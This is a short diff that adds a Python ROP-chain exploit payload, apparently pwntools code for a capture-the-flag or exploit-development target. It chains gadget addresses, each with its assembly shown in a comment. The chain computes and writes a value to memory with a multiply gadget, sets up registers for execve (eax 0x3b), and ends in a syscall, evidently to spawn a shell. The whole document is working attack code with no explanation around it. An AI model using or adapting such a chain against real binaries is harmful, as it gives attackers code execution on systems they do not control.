@@ -1,0 +1,27 @@
+payload = p64(0x457b3e)
+#0x0000000000457b3e: pop rdi; cmp al, ch; ret; 
+payload += p64(0x4b2050)+p64(0x46efab)
+# 0x46efab: pop rcx ; retf
+payload += p64(0x912e37a191969dd1)+p32(0x44c71f)+p32(0x33)
+# 0x000000000044c71f: imul rax, rcx; pop rbp; ret; 
+payload += p64(0x0)+p64(0x440abe)
+# 0x0000000000440abe: mov qword ptr [rdi + 8], rax; pop rbp; ret; 
+payload += p64(0x0)+p64(0x457b3e)
+# 0x0000000000457b3e: pop rdi; cmp al, ch; ret; 
+payload += p64(0x4b2058)+p64(0x429331)
+# 0x0000000000429331: pop rsi; pop rbp; ret; 
+payload += p64(0x3b)+p64(0x0)+p64(0x42932a)
+# 0x000000000042932a: mov eax, esi; add rsp, 8; pop r14; pop rbp; ret; 
+payload += p64(0x0)+p64(0x0)+p64(0x0)+p64(0x474f54)
+# 0x0000000000474f54: pop rbx; pop r14; pop rbp; ret; 
+payload += p64(0x429331)+p64(0x0)+p64(0x0)+p64(0x4011ad)
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x80)+p64(0x460dea)
+# 0x0000000000460dea: lea edx, [rbp - 0x80]; call rbx; 
+payload += b''
+# 0x0000000000429331: pop rsi; pop rbp; ret; 
+payload += p64(0x0)+p64(0x429331)
+# 0x0000000000429331: pop rsi; pop rbp; ret; 
+payload += p64(0x0)+p64(0x0)+p64(0x45abe5)
+# 0x000000000045abe5: syscall; 
+payload += b''
